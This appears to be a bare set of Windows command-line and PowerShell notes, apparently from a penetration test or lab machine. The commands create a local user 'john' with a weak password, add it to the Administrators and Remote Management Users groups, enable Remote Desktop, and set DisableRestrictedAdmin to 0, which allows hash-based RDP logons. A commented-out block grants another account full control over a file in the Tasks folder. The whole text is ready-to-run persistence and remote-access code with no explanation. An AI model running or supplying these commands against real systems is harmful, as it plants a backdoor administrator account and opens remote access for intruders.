net user john P@ssw0rd /add
net localgroup administrators john /add
net localgroup "Remote Management Users" john /add

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

<#$acl = Get-Acl c:\windows\tasks\fod.ps1

$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("vault01\jack","FullControl","Allow")

$acl.SetAccessRule($AccessRule)

$acl | Set-Acl c:\windows\tasks\file.txt
#>
